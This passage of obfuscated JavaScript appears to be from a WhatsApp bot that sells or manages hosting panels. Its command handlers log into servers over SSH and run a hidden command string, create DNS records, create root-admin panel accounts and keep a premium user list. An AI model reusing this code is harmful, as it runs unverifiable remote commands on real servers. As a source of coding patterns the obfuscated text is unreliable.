                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc02)](_0x1ac933, _0x2a5309[_0x5d4417(0xf9b)]));
                let _0x2615ff = _0x39ee63[-0x26f6 + 0x2543 * -0x1 + 0x4c39], _0x5c31b7 = _0x39ee63[-0x2 * -0x3c9 + 0x13cb + -0xce * 0x22];
                const _0x334b24 = _0x2a5309[_0x5d4417(0x110a)](_0x2a5309[_0x5d4417(0x1012)], _0x2a5309[_0x5d4417(0x474)](getRandom, '')), _0x1c66c3 = _0x2a5309[_0x5d4417(0xc47)](_0x2a5309[_0x5d4417(0x1012)], _0x2a5309[_0x5d4417(0x539)](getRandom, '')), _0x127700 = {
                        'host': _0x2615ff,
                        'port': '22',
                        'username': _0x2a5309[_0x5d4417(0x7ca)],
                        'password': _0x5c31b7
                    }, _0x18d8e9 = _0x5d4417(0xd9b) + _0x5d4417(0xeec) + _0x5d4417(0xd47) + _0x5d4417(0x62c) + _0x5d4417(0xbf9) + _0x5d4417(0xe02) + _0x5d4417(0x1d2) + _0x5d4417(0xb83) + _0x5d4417(0xda5) + _0x5d4417(0x5cf) + _0x5d4417(0x1111), _0x27fd41 = new Client();
                _0x27fd41['on'](_0x2a5309[_0x5d4417(0x186)], () => {
                    const _0x4365d3 = _0x5d4417, _0x132f92 = {
                            'pELZD': _0x2a5309[_0x4365d3(0x4d5)],
                            'rHOIl': _0x2a5309[_0x4365d3(0x222)],
                            'gJCGl': _0x2a5309[_0x4365d3(0xc8c)]
                        };
                    _0x27fd41[_0x4365d3(0xdd9)](_0x18d8e9, (_0xc7441e, _0x1a7dde) => {
                        const _0x323a0d = _0x4365d3;
                        if (_0xc7441e)
                            throw _0xc7441e;
                        _0x1a7dde['on'](_0x132f92[_0x323a0d(0xf06)], async (_0x278f2f, _0x592d12) => {
                            const _0x4021e0 = _0x323a0d;
                            let _0x5ec17a = _0x4021e0(0x5f2) + _0x4021e0(0x587) + _0x4021e0(0x23f) + _0x4021e0(0xab0) + _0x4021e0(0x1123) + _0x4021e0(0x8f5) + _0x4021e0(0x11ff) + _0x4021e0(0xfa1) + _0x334b24 + (_0x4021e0(0xa62) + _0x4021e0(0x519)) + _0x1c66c3 + '\x0a';
                            await _0x57ed02[_0x4021e0(0x367) + 'e'](_0xedb653[_0x4021e0(0x9e2)], { 'text': _0x5ec17a }, { 'quoted': _0xedb653 }), _0x27fd41[_0x4021e0(0x825)]();
                        })['on'](_0x132f92[_0x323a0d(0x1ce)], async _0x185ea0 => {
                            const _0xb085d = _0x323a0d;
                            await console[_0xb085d(0xd16)](_0x185ea0[_0xb085d(0xef4)]());
                        })[_0x323a0d(0x553)]['on'](_0x132f92[_0x323a0d(0x1ce)], _0x42fdc8 => {
                            const _0x3138db = _0x323a0d;
                            _0x1a7dde[_0x3138db(0xbf8)](_0x132f92[_0x3138db(0x101b)]), _0x1a7dde[_0x3138db(0xbf8)]('7\x0a'), _0x1a7dde[_0x3138db(0xbf8)](_0x334b24 + '\x0a'), _0x1a7dde[_0x3138db(0xbf8)](_0x1c66c3 + '\x0a');
                        });
                    });
                })['on'](_0x2a5309[_0x5d4417(0xcf8)], _0x19485f => {
                    const _0x20ea70 = _0x5d4417;
                    console[_0x20ea70(0xd16)](_0x2a5309[_0x20ea70(0x2ab)](_0x2a5309[_0x20ea70(0xc71)], _0x19485f)), _0xedb653[_0x20ea70(0x105d)](_0x2a5309[_0x20ea70(0x469)]);
                })[_0x5d4417(0x1091)](_0x127700);
            }
            break;
        case _0x2a5309[_0x5d4417(0x453)]:
        case _0x2a5309[_0x5d4417(0x7c7)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x100b)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf7f)](_0x1ac933, _0x2a5309[_0x5d4417(0xded)]));
                if (!_0x156b97[_0x5d4417(0xc6c)]('|'))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x50c)](_0x1ac933, _0x2a5309[_0x5d4417(0xded)]));
                let [_0x3db34c, _0x4f8240] = _0x156b97[_0x5d4417(0xc6c)]('|'), _0x29bf3b = await Object[_0x5d4417(0x1af)](global[_0x5d4417(0xb27)]), _0x2b3de0 = [];
                for (let _0x264bb2 of _0x29bf3b) {
                    await _0x2b3de0[_0x5d4417(0x706)]({
                        'title': _0x264bb2,
                        'id': _0x5d4417(0x577) + _0x2a5309[_0x5d4417(0xdc2)](_0x29bf3b[_0x5d4417(0x872)](_0x264bb2), -0x15d9 + 0x35 * -0x56 + 0x27a8 * 0x1) + '\x20' + _0x3db34c + '|' + _0x4f8240
                    });
                }
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'buttons': [{
                            'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                            'type': 0x4,
                            'nativeFlowInfo': {
                                'name': _0x2a5309[_0x5d4417(0xdc6)],
                                'paramsJson': JSON[_0x5d4417(0x78f)]({
                                    'title': _0x2a5309[_0x5d4417(0xaed)],
                                    'sections': [{
                                            'title': _0x2a5309[_0x5d4417(0x713)],
                                            'highlight_label': _0x2a5309[_0x5d4417(0x3b9)],
                                            'rows': [..._0x2b3de0]
                                        }]
                                })
                            }
                        }],
                    'footer': _0x5d4417(0xee4) + botname,
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'text': _0x2a5309[_0x5d4417(0x8d0)],
                    'contextInfo': {
                        'isForwarded': !![],
                        'mentionedJid': [
                            _0xedb653[_0x5d4417(0xeee)],
                            _0x2a5309[_0x5d4417(0xd1b)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                        ]
                    }
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x818)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xf1f)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x5c5935[0x29 * 0x90 + 0x238a * 0x1 + -0x3a9a])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xacf)]);
                if (_0x2a5309[_0x5d4417(0x4fd)](isNaN, _0x5c5935[0xd06 * 0x1 + -0x181a + 0xb14]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xacf)]);
                const _0x11d0c4 = Object[_0x5d4417(0x1af)](global[_0x5d4417(0xb27)]);
                if (_0x2a5309[_0x5d4417(0x4d7)](_0x2a5309[_0x5d4417(0x7a2)](Number, _0x5c5935[-0x3e * 0x83 + -0x179 * 0x13 + 0x3bb5]), _0x11d0c4[_0x5d4417(0xf65)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xacf)]);
                if (!_0x5c5935[0xc33 * 0x1 + 0x99c + 0x15ce * -0x1][_0x5d4417(0xc6c)]('|'))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2f4)]);
                let _0xf52948 = _0x11d0c4[_0x2a5309[_0x5d4417(0x1d7)](_0x5c5935[-0x15d3 + 0x1976 + -0x3a3 * 0x1], -0xb77 + -0x145e + 0x1fd6)];
                const [_0x2c9152, _0x3ead40] = _0x5c5935[-0x917 * -0x1 + 0x1802 + 0x3 * -0xb08][_0x5d4417(0xc6c)]('|');
                async function _0x2c8a7f(_0xe52e2b, _0x5f3e72) {
                    const _0x106b15 = {
                        'kFlAd': function (_0x39979f, _0x5cd4a4) {
                            const _0x4656b3 = _0x4f4e;
                            return _0x2a5309[_0x4656b3(0x5ca)](_0x39979f, _0x5cd4a4);
                        }
                    };
                    return new Promise(_0x22699c => {
                        const _0x144233 = _0x4f4e, _0x164871 = {
                                'jXmxF': function (_0x51c2e2, _0x40d569) {
                                    const _0x28ea18 = _0x4f4e;
                                    return _0x2a5309[_0x28ea18(0x53a)](_0x51c2e2, _0x40d569);
                                }
                            };
                        axios[_0x144233(0xd73)](_0x144233(0xb54) + _0x144233(0xb84) + _0x144233(0x7a9) + _0x144233(0x104d) + _0x144233(0xcb5) + global[_0x144233(0xb27)][_0xf52948][_0x144233(0xbcf)] + (_0x144233(0xc78) + 'ds'), {
                            'type': 'A',
                            'name': _0x2a5309[_0x144233(0x2ab)](_0x2a5309[_0x144233(0x1048)](_0xe52e2b[_0x144233(0xe51)](/[^a-z0-9.-]/gi, ''), '.'), _0xf52948),
                            'content': _0x5f3e72[_0x144233(0xe51)](/[^0-9.]/gi, ''),
                            'ttl': 0xe10,
                            'priority': 0xa,
                            'proxied': ![]
                        }, {
                            'headers': {
                                'Authorization': _0x2a5309[_0x144233(0x343)](_0x2a5309[_0x144233(0xbee)], global[_0x144233(0xb27)][_0xf52948][_0x144233(0xb3f)]),
                                'Content-Type': _0x2a5309[_0x144233(0xe03)]
                            }
                        })[_0x144233(0xe2e)](_0x364b4b => {
                            const _0x194366 = _0x144233;
                            let _0xac6547 = _0x364b4b[_0x194366(0x1059)];
                            if (_0xac6547[_0x194366(0x1193)])
                                _0x164871[_0x194366(0x836)](_0x22699c, {
                                    'success': !![],
                                    'zone': _0xac6547[_0x194366(0x346)]?.[_0x194366(0x347)],
                                    'name': _0xac6547[_0x194366(0x346)]?.[_0x194366(0x277)],
                                    'ip': _0xac6547[_0x194366(0x346)]?.[_0x194366(0x1119)]
                                });
                        })[_0x144233(0x1b0)](_0x5d6dbc => {
                            const _0x41a970 = _0x144233;
                            let _0x5d0193 = _0x5d6dbc[_0x41a970(0x23d)]?.[_0x41a970(0x1059)]?.[_0x41a970(0x7e1)]?.[0x765 + -0x1c41 + 0x14dc]?.[_0x41a970(0x2f3)] || _0x5d6dbc[_0x41a970(0x23d)]?.[_0x41a970(0x1059)]?.[_0x41a970(0x7e1)] || _0x5d6dbc[_0x41a970(0x23d)]?.[_0x41a970(0x1059)] || _0x5d6dbc[_0x41a970(0x23d)] || _0x5d6dbc, _0x9e0b9c = _0x106b15[_0x41a970(0x11f4)](String, _0x5d0193);
                            _0x106b15[_0x41a970(0x11f4)](_0x22699c, {
                                'success': ![],
                                'error': _0x9e0b9c
                            });
                        });
                    });
                }
                await _0x2a5309[_0x5d4417(0xfa0)](_0x2c8a7f, _0x2c9152[_0x5d4417(0xec1) + 'e'](), _0x3ead40)[_0x5d4417(0xe2e)](async _0x1d880f => {
                    const _0xd7a171 = _0x5d4417;
                    if (_0x1d880f[_0x2a5309[_0xd7a171(0xa33)]]) {
                        let _0x1b2d0e = _0xd7a171(0x1093) + _0xd7a171(0xcc4) + _0xd7a171(0xcda) + _0xd7a171(0xdaa) + _0xd7a171(0x5f5) + _0x1d880f['ip'] + (_0xd7a171(0xdd7) + _0xd7a171(0x1156)) + _0x1d880f[_0x2a5309[_0xd7a171(0x227)]] + '\x0a';
                        await _0xedb653[_0xd7a171(0x105d)](_0x1b2d0e);
                    } else
                        return _0xedb653[_0xd7a171(0x105d)]('' + _0x1d880f[_0x2a5309[_0xd7a171(0xcf8)]]);
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0xd71)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xf7f)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xecc)](_0x1ac933, _0x2a5309[_0x5d4417(0xaa8)]));
                let _0x15b86b = _0x156b97[_0x5d4417(0xec1) + 'e'](), _0x1ec6ec = _0x2a5309[_0x5d4417(0x3e1)](_0x15b86b, _0x2a5309[_0x5d4417(0x1082)]), _0x1ff3b8 = _0x2a5309[_0x5d4417(0xb4f)](capital, _0x5c5935[0x1 * 0x177b + 0x5 * -0x737 + -0x4 * -0x326]), _0x381612 = _0x2a5309[_0x5d4417(0xbe4)](_0x15b86b, crypto[_0x5d4417(0xda8) + 's'](-0xe79 + 0xb24 + 0x357)[_0x5d4417(0xef4)](_0x2a5309[_0x5d4417(0x5c4)])), _0x30efa5 = await _0x2a5309[_0x5d4417(0xfb0)](fetch, _0x2a5309[_0x5d4417(0xdfe)](domain, _0x2a5309[_0x5d4417(0x9d4)]), {
                        'method': _0x2a5309[_0x5d4417(0x3a6)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x91d)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        },
                        'body': JSON[_0x5d4417(0x78f)]({
                            'email': _0x1ec6ec,
                            'username': _0x15b86b[_0x5d4417(0xec1) + 'e'](),
                            'first_name': _0x1ff3b8,
                            'last_name': _0x2a5309[_0x5d4417(0x4be)],
                            'root_admin': !![],
                            'language': 'en',
                            'password': _0x381612[_0x5d4417(0xef4)]()
                        })
                    }), _0xf64a80 = await _0x30efa5[_0x5d4417(0x728)]();
                if (_0xf64a80[_0x5d4417(0x7e1)])
                    return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0xf64a80[_0x5d4417(0x7e1)][-0x5 * -0x6bb + 0x8e6 + -0x2a8d], null, -0xed * -0x2 + 0xeb8 + -0x1090));
                let _0x47a427 = _0xf64a80[_0x5d4417(0x7f4)];
                var _0x16d8bc;
                _0xedb653[_0x5d4417(0xe3e)] ? (_0x16d8bc = _0xedb653[_0x5d4417(0xeee)], await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbe2)])) : _0x16d8bc = _0xedb653[_0x5d4417(0x9e2)];
                var _0x4417bc = _0x5d4417(0x72a) + _0x5d4417(0xd9e) + _0x5d4417(0x486) + _0x5d4417(0xe3a) + _0x47a427['id'] + (_0x5d4417(0xa34) + _0x5d4417(0xfa1)) + _0x47a427[_0x5d4417(0x1104)] + (_0x5d4417(0xe57) + _0x5d4417(0x519)) + _0x381612[_0x5d4417(0xef4)]() + _0x5d4417(0x56a) + global[_0x5d4417(0xed6)] + (_0x5d4417(0xa56) + _0x5d4417(0x78d) + _0x5d4417(0x4bd) + _0x5d4417(0x411) + _0x5d4417(0x838) + _0x5d4417(0xfc8) + _0x5d4417(0xa7d) + _0x5d4417(0x29f) + _0x5d4417(0x5e7) + _0x5d4417(0x252) + _0x5d4417(0xef9) + _0x5d4417(0x1101) + _0x5d4417(0x91f) + _0x5d4417(0xf63) + _0x5d4417(0xe5a) + _0x5d4417(0xee7));
                await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x81f)], _0x4417bc), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x16d8bc, {
                    'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x81f)]),
                    'fileName': _0x2a5309[_0x5d4417(0x727)],
                    'mimetype': _0x2a5309[_0x5d4417(0x100e)],
                    'caption': _0x4417bc
                }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0x2a5309[_0x5d4417(0x81f)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0xf8b)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x338)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x30d)](_0x1ac933, _0x2a5309[_0x5d4417(0xaa8)]));
                let _0x5be917 = _0x156b97[_0x5d4417(0xec1) + 'e'](), _0x3c4c11 = _0x2a5309[_0x5d4417(0xdfe)](_0x5be917, _0x2a5309[_0x5d4417(0x1082)]), _0x5e11f0 = _0x2a5309[_0x5d4417(0x796)](capital, _0x5c5935[-0x160e + -0x1209 + -0x21 * -0x137]), _0x7b626d = _0x2a5309[_0x5d4417(0x100f)](_0x5be917, crypto[_0x5d4417(0xda8) + 's'](0xc1e + 0x1b52 + 0x13b7 * -0x2)[_0x5d4417(0xef4)](_0x2a5309[_0x5d4417(0x5c4)])), _0x3f19a7 = await _0x2a5309[_0x5d4417(0x878)](fetch, _0x2a5309[_0x5d4417(0x110a)](domainV2, _0x2a5309[_0x5d4417(0x9d4)]), {
                        'method': _0x2a5309[_0x5d4417(0x3a6)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x2ab)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        },
                        'body': JSON[_0x5d4417(0x78f)]({
                            'email': _0x3c4c11,
                            'username': _0x5be917[_0x5d4417(0xec1) + 'e'](),
                            'first_name': _0x5e11f0,
                            'last_name': _0x2a5309[_0x5d4417(0x4be)],
                            'root_admin': !![],
                            'language': 'en',
                            'password': _0x7b626d[_0x5d4417(0xef4)]()
                        })
                    }), _0xa8315c = await _0x3f19a7[_0x5d4417(0x728)]();
                if (_0xa8315c[_0x5d4417(0x7e1)])
                    return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0xa8315c[_0x5d4417(0x7e1)][-0x1 * -0x2684 + 0x2401 + -0x4a85], null, 0x327 + 0x1 * -0x1a23 + 0x16fe));
                let _0x377ceb = _0xa8315c[_0x5d4417(0x7f4)];
                var _0x16d8bc;
                _0xedb653[_0x5d4417(0xe3e)] ? (_0x16d8bc = _0xedb653[_0x5d4417(0xeee)], await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbe2)])) : _0x16d8bc = _0xedb653[_0x5d4417(0x9e2)];
                var _0x4417bc = _0x5d4417(0x72a) + _0x5d4417(0xd9e) + _0x5d4417(0x486) + _0x5d4417(0xe3a) + _0x377ceb['id'] + (_0x5d4417(0xa34) + _0x5d4417(0xfa1)) + _0x377ceb[_0x5d4417(0x1104)] + (_0x5d4417(0xe57) + _0x5d4417(0x519)) + _0x7b626d[_0x5d4417(0xef4)]() + _0x5d4417(0x56a) + global[_0x5d4417(0x4fe)] + (_0x5d4417(0xa56) + _0x5d4417(0x78d) + _0x5d4417(0x4bd) + _0x5d4417(0x411) + _0x5d4417(0x838) + _0x5d4417(0xfc8) + _0x5d4417(0xa7d) + _0x5d4417(0x29f) + _0x5d4417(0x5e7) + _0x5d4417(0x252) + _0x5d4417(0xef9) + _0x5d4417(0x1101) + _0x5d4417(0x91f) + _0x5d4417(0xf63) + _0x5d4417(0xe5a) + _0x5d4417(0xee7));
                await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x81f)], _0x4417bc), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x16d8bc, {
                    'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x81f)]),
                    'fileName': _0x2a5309[_0x5d4417(0x727)],
                    'mimetype': _0x2a5309[_0x5d4417(0x100e)],
                    'caption': _0x4417bc
                }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0x2a5309[_0x5d4417(0x81f)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0xd3a)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xfbb)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x448)](_0x1ac933, _0x2a5309[_0x5d4417(0x5bd)]));
                if (!_0x156b97[_0x5d4417(0xc6c)]('|'))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x95e)](_0x1ac933, _0x2a5309[_0x5d4417(0x5bd)]));
                let _0x5a0e17 = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0xd18)](_0x5a0e17[_0x5d4417(0xf65)], 0x1 * -0x19ed + -0x1 * -0x87d + 0x1172))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf7c)](_0x1ac933, _0x2a5309[_0x5d4417(0x5bd)]));
                const [_0x5af618, _0x911f26] = _0x5a0e17;
                let _0x41cb90 = list[_0x5d4417(0x49a)](_0x143001 => _0x143001[_0x5d4417(0x82a)] == _0x5af618[_0x5d4417(0xec1) + 'e']());
                if (_0x41cb90)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x65c)]);
                let _0x12b8f8 = {
                    'cmd': _0x5af618[_0x5d4417(0xec1) + 'e'](),
                    'respon': _0x911f26
                };
                list[_0x5d4417(0x706)](_0x12b8f8), fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0xd06)], JSON[_0x5d4417(0x78f)](list, null, -0x1b43 * -0x1 + 0x1 * -0x3bf + -0x1782)), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0xb16) + _0x5d4417(0x6f8) + _0x5af618[_0x5d4417(0xec1) + 'e']() + (_0x5d4417(0x71d) + _0x5d4417(0x787) + _0x5d4417(0x802)));
            }
            break;
        case _0x2a5309[_0x5d4417(0x49e)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xff9)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xed0)](_0x1ac933, _0x2a5309[_0x5d4417(0x4ee)]));
                const _0x18b747 = _0x156b97[_0x5d4417(0xec1) + 'e']();
                let _0x3cbc7b = list[_0x5d4417(0x49a)](_0x5d1e2c => _0x5d1e2c[_0x5d4417(0x82a)] == _0x18b747[_0x5d4417(0xec1) + 'e']());
                if (!_0x3cbc7b)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb4b)]);
                let _0x151cff = list[_0x5d4417(0x872)](_0x3cbc7b);
                await list[_0x5d4417(0xa5a)](_0x151cff, -0xa55 + 0x18da * -0x1 + 0x8 * 0x466), fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0xd06)], JSON[_0x5d4417(0x78f)](list, null, 0x2581 + -0x8c5 + -0x1cba)), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0xbf7) + _0x5d4417(0xaba) + '*' + _0x18b747[_0x5d4417(0xec1) + 'e']() + (_0x5d4417(0x10ba) + _0x5d4417(0xb26) + 'on'));
            }
            break;
        case _0x2a5309[_0x5d4417(0xe25)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x2ac)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (_0x2a5309[_0x5d4417(0x192)](list[_0x5d4417(0xf65)], 0xd73 + 0x13b * -0x15 + 0xc65))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x686)]);
                let _0xf15765 = _0x2a5309[_0x5d4417(0xaae)];
                await list[_0x5d4417(0x102c)](_0x1a4977 => _0xf15765 += _0x5d4417(0x943) + '\x20' + _0x1a4977[_0x5d4417(0x82a)] + '\x0a'), _0xedb653[_0x5d4417(0x105d)]('' + _0xf15765);
            }
            break;
        case _0x2a5309[_0x5d4417(0x235)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xe98)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97 && !_0xedb653[_0x5d4417(0x7eb)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x7a0)](_0x1ac933, _0x2a5309[_0x5d4417(0xfe8)]));
                const _0x7dbba3 = _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)] : _0x2a5309[_0x5d4417(0xa5b)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]), _0xb50005 = _0x7dbba3[_0x5d4417(0xc6c)]('@')[-0x3 * 0xad9 + 0x3b * 0x1a + 0x3cb * 0x7];
                if (_0x2a5309[_0x5d4417(0x8d2)](_0xb50005, global[_0x5d4417(0x41d)]) || premium[_0x5d4417(0x3d3)](_0x7dbba3) || _0x2a5309[_0x5d4417(0xc79)](_0x7dbba3, _0x4815f3))
                    return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xa86) + _0xb50005 + (_0x5d4417(0x516) + _0x5d4417(0x487) + _0x5d4417(0x23b)));
                premium[_0x5d4417(0x706)](_0x7dbba3), await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x407)], JSON[_0x5d4417(0x78f)](premium, null, 0x2a6 + 0x108c + 0x8 * -0x266)), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0x9c1) + _0x5d4417(0x2a1));
            }
            break;
        case _0x2a5309[_0x5d4417(0xfcc)]: {
                if (_0x2a5309[_0x5d4417(0x26b)](premium[_0x5d4417(0xf65)], 0x24a3 + 0x33a * 0xb + -0x8 * 0x904))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x66f)]);
                let _0x22b208 = _0x5d4417(0x88c) + _0x5d4417(0xa77) + _0x5d4417(0x623);
                for (let _0x52d0c5 of premium) {
                    _0x22b208 += _0x5d4417(0x56a) + _0x52d0c5[_0x5d4417(0xc6c)]('@')[0xae * -0x1 + -0x69 * -0x2c + 0x13 * -0xea] + (_0x5d4417(0x517) + '\x20@') + _0x52d0c5[_0x5d4417(0xc6c)]('@')[0x1af5 + -0x1c84 + 0x18f] + '\x0a';
                }
                _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x22b208,
                    'mentions': premium
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x1182)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x93c)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0xedb653[_0x5d4417(0x7eb)] && !_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x6db)](_0x1ac933, _0x2a5309[_0x5d4417(0xfe8)]));
                const _0x1ecbd5 = _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)] : _0x2a5309[_0x5d4417(0x119b)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]), _0x1327e1 = _0x1ecbd5[_0x5d4417(0xc6c)]('@')[-0x556 * 0x6 + -0x8b * 0x35 + -0x4f * -0xc5];
                if (_0x2a5309[_0x5d4417(0xfbe)](_0x1327e1, global[_0x5d4417(0x41d)]) || _0x2a5309[_0x5d4417(0xbb9)](_0x1ecbd5, _0x4815f3))
                    return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xee8) + _0x5d4417(0x58b) + _0x5d4417(0xb59));
                if (!premium[_0x5d4417(0x3d3)](_0x1ecbd5))
                    return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xa86) + _0x1327e1 + (_0x5d4417(0x8ed) + _0x5d4417(0x371)));
                let _0x523336 = premium[_0x5d4417(0x872)](_0x1ecbd5);
                await premium[_0x5d4417(0xa5a)](_0x523336, 0xd * -0xfb + 0xd * 0x101 + -0x4d), await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x407)], JSON[_0x5d4417(0x78f)](premium, null, 0x204f + -0x797 + -0x18b6)), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0xb10) + _0x5d4417(0xfe5));
            }
            break;
        case _0x2a5309[_0x5d4417(0x1046)]:
        case _0x2a5309[_0x5d4417(0x622)]: {
                if (_0xedb653[_0x5d4417(0xe3e)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x433)]);
                if (db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x3ad)]);
                if (!_0x156b97)
                    return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'buttons': [{
                                'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                'type': 0x4,
                                'nativeFlowInfo': {
                                    'name': _0x2a5309[_0x5d4417(0xdc6)],
                                    'paramsJson': JSON[_0x5d4417(0x78f)]({
                                        'title': _0x2a5309[_0x5d4417(0x198)],
                                        'sections': [{
                                                'title': _0x2a5309[_0x5d4417(0x458)],
                                                'highlight_label': _0x2a5309[_0x5d4417(0x3b9)],
                                                'rows': [
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0xa8c)],
                                                        'description': _0x2a5309[_0x5d4417(0x1204)],
                                                        'id': _0x2a5309[_0x5d4417(0x3c8)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x550)],
                                                        'description': _0x2a5309[_0x5d4417(0xe7d)],
                                                        'id': _0x2a5309[_0x5d4417(0x862)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0xa46)],
                                                        'description': _0x2a5309[_0x5d4417(0xe0b)],
                                                        'id': _0x2a5309[_0x5d4417(0x892)]
                                                    }
                                                ]
                                            }]
                                    })
                                }
                            }],
                        'footer': _0x5d4417(0xee4) + botname,
                        'headerType': 0x1,
                        'viewOnce': !![],
